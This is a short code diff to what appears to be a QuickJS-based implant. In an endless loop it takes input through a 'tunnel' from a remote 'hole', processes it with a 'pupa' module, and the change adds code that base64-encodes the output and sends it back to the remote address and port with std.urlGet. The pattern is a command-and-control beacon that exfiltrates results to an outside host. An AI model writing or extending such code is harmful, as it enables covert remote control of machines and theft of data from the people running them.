@@ -2,6 +2,7 @@ import * as os from "os";
 import * as std from "std";
 import burrow from "./burrow";
 import pupa from "./pupa";
+import base64 from "./b64/b64.js";
 
 let hole = burrow();
 
@@ -12,8 +13,13 @@ let tunnel = callback => {
 
 for(;;) {
   tunnel( function(res) {
-    pupa(res);
-    console.log(`Closing`);
+    let sendBack = true;
+    let feedback = pupa(res);
+console.log("End pupa");
+console.log(`[DEBUG]${hole.address}:${hole.port}/${base64("e", feedback)}`);
+
+    console.log(feedback);
+    feedback && sendBack ? std.urlGet(`${hole.address}:${hole.port}/${base64("e", feedback)}`) : console.log(`Closing`);
   });
 }
 
